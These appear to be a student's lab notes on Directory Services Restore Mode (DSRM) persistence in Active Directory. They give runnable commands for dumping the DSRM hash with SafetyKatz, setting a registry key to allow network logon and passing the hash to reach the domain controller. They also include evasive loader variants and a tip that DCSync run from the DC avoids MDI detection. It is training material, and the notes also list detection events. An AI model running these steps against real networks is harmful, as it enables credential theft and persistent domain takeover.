![[Pasted image 20250729032100.png]]
- DSRM stands for Directory Services Restore Mode.
- There is a local administrator on every DC called "Administrator" (RID:500) whose password is the DSRM password.
- DSRM password (SafeModePassword) is required when a server is promoted to DC, and this password is rarely changed.
- DSRM password is called "SafeModePassword" when we are using the PowerShell command-line.
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.

#### Understanding DSRM
- DSRM is a fallback for when AD DS (Directory Services) fail to start on the DC itself, which means you cannot log on to the DC without booting into Safe Mode.
- When we are in Safe Mode, the domain AD DS is not booted, so we have to log on to the DC using a special local administrator account, called the DSRM account.
- The DSRM password is required to log on to the safe mode on the DC.
- We abuse the DSRM account by flipping a registry key on the DC, we can actually use it to access the DC as the DSRM administrator.
- The Persistence shelf life of this attack is only second to the DPAPI backup keys, because the DPAPI backup keys cannot be changed, even if we want to.
	- So, from an attacker's point of view the DSRM password is the thing that would have the longest shelf life.
	- Just like the krbtgt password, the DSRM password is not rotated automatically.
- Organisational issues during the implementation of the DSRM password:
	- The problem with the DSRM Administrator is that not a lot of people understand it.
	- The administrator who set the DSRM password is probably already retired :)
	- A lot of organisations do not even know or document the DSRM password, no one knows what the DSRM password is.
	- Many organisations have multiple DCs, so if one goes down, they would either pull in a hot backup, or would restore it to the daily backup.
- Is the DSRM question disabled?
	- No, but network log-on is disabled for this account.
	- This account is from that era, where sysadmins would have a console, and have to walk in to the server rack, pull out the console and log on to the DC to fix stuff.

#### Maintaining Persistence through the DSRM password
- Since this is a persistence technique, we are assuming DA privileges.
- Dump DSRM password (Needs DA privs, on DC)
	- `SafetyKatz.exe "token::elevate" "lsadump::sam"`
	- The DSRM password needs to be dumped from the SAM hive, since local users' credentials (NTLM hash) are stored in the SAM hive.
	- If we compare this with credential extraction for the DA hash, we clearly see the distinction between both the accounts and their respective credential extraction techniques.
		- `SafetyKatz.exe "lsadump::lsa /patch"`
- Since the DSRM administrator is a local administrator account, we can pass its hash to authenticate to the DC. But before doing so, we need to change the Logon Behaviour for the DSRM account.
	- `winrs -r:dcorp-dc cmd`
	- `reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f`
		- This is our chance of defending an attack, the moment someone touches the DSRM logon registry key, there should be alarms all around.
		- The changes we made to the registry key enable us to login to the DSRM account from the network.
- Logging in to the DC by performing a Pass-the-Hash attack using the DSRM hash:
	- `SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<NTLM hash of the DSRM account> /run:powershell.exe`
		- The `/domain` parameter here specified the name of the DC, not the FQDN of the domain.
	- PowerShell Remoting requires that if we use NTLM hashes along with an I.P. address, the target host must be in the list of the Trusted Hosts.
		- `Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1`
	- Connecting to the DC via PowerShell Remoting, while using the I.P. address of the DC, and the NTLM hash of the DSRM account.
		- `Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential`
			- Note that we are using `Enter-PSSession` with an I.P. address, Kerberos doesn't understand I.P. addresses, so this is using NTLM authentication, for which we have to specify the `-Authentication NegotiateWithImplicitCredential` part of the command.
- Logs generated on the DC during the attack:
	- 4624
	- 4634
	- 4672 (Admin Logon)

#### Learning Objective 11
- During additional lab time:
	1. Use DA privileges obtained earlier to abuse DSRM credentials for persistence.
		- Dumping DSRM local administrator credentials:
			- `C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"`
			- At this stage, we can compare the DA hash with the DSRM local administrator hash if we want.
		- Modifying the registry to enable network login for the DSRM local administrator account:
			- `reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f`
		- Now, we can go back to the student VM, and try authenticating with the DSRM credentials, and starting a new process:
			- `C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:<NTLM hash of the DSRM account> /run:cmd.exe" "exit"`
				- `whoami`
					- The `whoami` command will still show us that the user is `studentX`, since we logged on with logon type 9.
					- However, if we try accessing a remote resource, the new credentials would be used, i.e., we would be able to access the DC as the DSRM administrator.
				- `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`
				- `Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential`
				- `$env:username`
					- This should print "Administrator", since we are able to access the DC through the local administrator account present on it, which is the DSRM administrator account.
		- What can we do with the DSRM local administrator account?
			- We can do many things, for example, we can run the DCSync attack right from the DC itself, because it would not get detected, since MDI cares only if we run a DCSync attack from outside the DC.